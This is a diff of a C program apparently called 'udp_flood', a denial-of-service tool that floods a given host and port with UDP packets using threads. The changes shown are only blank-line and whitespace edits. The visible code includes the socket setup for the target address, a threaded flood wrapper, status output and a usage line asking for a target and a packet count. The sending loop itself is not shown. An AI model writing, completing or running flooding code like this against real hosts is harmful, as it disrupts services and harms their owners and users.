@@ -13,11 +13,11 @@ int counter = 0, packet_num = 0, ec = 0, p = 1;
  * sending the UDP packets to the target..
 */
 void udp_flood(char *dest_ip, char *port) {
-
     struct addrinfo hints;
     memset(&hints, 0, sizeof(hints));
     hints.ai_socktype = SOCK_DGRAM;
     struct addrinfo *peer_address;
+
     if(getaddrinfo(dest_ip, port, &hints, &peer_address)) {
         fprintf(stderr, "%s[%sERROR%s]:%s Failed to configure remote address %s%s%s\n",
         whi, red, whi, res, pur, strerror(errno), res);
@@ -61,10 +61,12 @@ void udp_flood(char *dest_ip, char *port) {
     freeaddrinfo(peer_address);
     close(sock);
 }
+
 void print_status(char *ip) {
     printf("%s[%sINFO%s]:%s Sending UDP packet through port %s...(%d/%d)\n", 
     whi, gre, whi, res, ip, counter, packet_num);
 }
+
 void *udp_flood_thread(void *vargb) {
     char *host = (char *)vargb;
     char port[20];
@@ -76,8 +78,8 @@ void *udp_flood_thread(void *vargb) {
     p++;
     return NULL;
 }
-int main(int argc, char *argv[]) {
 
+int main(int argc, char *argv[]) {
     if(argc < 3) {
         printf("%s[%sCRITICAL%s]:%s Missing argument(s)...\n", whi, yel, whi, res);
         fprintf(stderr, "%sUsage:%s udp_flood [hostname/IP] [number of packets to send]\n", whi, res);
